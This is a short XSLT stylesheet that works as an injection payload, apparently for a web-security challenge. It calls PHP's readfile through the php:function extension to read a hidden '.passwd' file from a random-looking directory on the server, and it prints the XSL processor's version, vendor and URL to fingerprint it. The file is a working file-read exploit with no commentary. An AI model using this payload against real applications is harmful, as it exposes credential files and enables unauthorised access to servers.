<xsl:stylesheet xmlns:xsl = "http://www.w3.org/1999/XSL/Transform" 
		version = "1.0" 
		xmlns:php = "http://php.net/xsl" >

	<xsl:output method = "html" />

		<xsl:template match = "/" >
			<xsl:value-of select="php:function('readfile','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
			<xsl:text >	Version :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:version')" />
			<xsl:text >	Vendor :  </xsl:text>
				<xsl:value-of select = "system-property('xsl:vendor')" />
			<xsl:text >	URL :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:vendor-url')" />
		</xsl:template>
</xsl:stylesheet>
